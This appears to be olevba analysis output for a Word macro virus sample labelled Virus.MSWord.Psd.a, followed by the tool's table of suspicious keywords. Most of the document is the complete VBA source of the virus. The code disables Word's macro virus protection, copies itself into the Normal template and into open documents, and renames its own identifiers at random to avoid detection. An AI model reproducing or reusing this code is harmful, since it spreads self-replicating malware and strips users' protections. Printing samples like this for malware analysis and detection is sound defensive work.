olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-ba4089ff841dd6b35d02b0d525daf6297a275695
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-ba4089ff841dd6b35d02b0d525daf6297a275695 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If 1 = 1 Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
RM1168 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PV8499 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CG7547 = ActiveDocument.VBProject.VBComponents.Item(1)
LJ858 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set CG7547 = NormalTemplate.VBProject.VBComponents.Item(1)
AO6121 = True
Call GP4049_IQ598
ActiveDocument.Saved = True
End If
If AO6121 <> True And LJ858 <> True Then GoTo CS1934
If AO6121 = True Then CG7547.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RM1168 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If LJ858 = True Then CG7547.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PV8499 - 3))
CS1934:
If PV8499 <> 0 And RM1168 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function GP4049_IQ598()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "DD9325": r1(2) = "OQ3019": r1(3) = "AM4972": r1(4) = "HB164": r1(5) = "IQ598": r1(6) = "RM1168"
r1(7) = "PV8499": r1(8) = "LJ858":: r1(9) = "CG7547": r1(10) = "AO6121": r1(11) = "CS1934": r1(12) = "GP4049": r1(13) = "RL9677": r1(14) = "HA3993"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call IQ598(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function IQ598(HA3993, RL9677 As String)
On Error Resume Next
Dim DD9325 As Long: Dim OQ3019 As Long: Dim AM4972 As Long: Dim HB164 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DD9325 = 1: OQ3019 = 1: AM4972 = .CountOfLines: HB164 = Len(.Lines(.CountOfLines, 1))
Do While .Find(RL9677, DD9325, OQ3019, AM4972, HB164, True)
strline = .Lines(DD9325, 1)
strline = Left(strline, OQ3019 - 1) & HA3993 & Mid(strline, HB164)
.replaceline DD9325, strline
DD9325 = AM4972 + 1: OQ3019 = 1:
AM4972 = .CountOfLines
HB164 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
